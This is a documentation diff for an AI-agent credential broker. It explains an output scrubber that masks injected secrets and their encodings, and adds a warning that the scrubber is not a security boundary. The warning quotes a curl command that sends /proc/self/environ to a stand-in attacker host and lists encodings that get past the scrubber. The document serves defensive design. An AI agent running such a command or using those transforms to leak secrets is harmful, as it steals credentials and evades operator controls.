@@ -174,6 +174,23 @@ A scrub hit replaces the matched substring with a `[REDACTED:<type>]`
 marker. The operator can search journal entries for the marker to
 investigate which agent tried to echo what.
 
+For the keeper credential-use path (`/execute`), the scrubber additionally
+masks the **injected secret's own value** and its common encodings — literal,
+base64 (std/URL, padded and raw), base32, URL-escape, hex (lower/upper), and
+reversed — so `echo $TOKEN | base64` and friends don't leak it in the returned
+output.
+
+<Warning>
+The scrubber is **defense-in-depth, not a boundary** (#1022 / #1064). A per-secret
+encoding set can never enumerate every transform a single tool can apply
+(gzip/deflate, split/chunked output, XOR, a custom alphabet), and it does nothing
+against a tool that self-exfiltrates without ever printing the secret — e.g.
+`curl --data-binary @/proc/self/environ https://attacker`. The real containment
+for single-tool self-exfil is **Layer 1 (sandbox) + egress policy**; the
+dedicated private-bridge + egress-enforcement work is tracked as EPIC #1001 M2b.
+Never treat "the scrubber will catch it" as a safety property.
+</Warning>
+
 ## Layer 4 — Keeper policy layer
 
 Even with credentials brokered and output scrubbed, the agent can
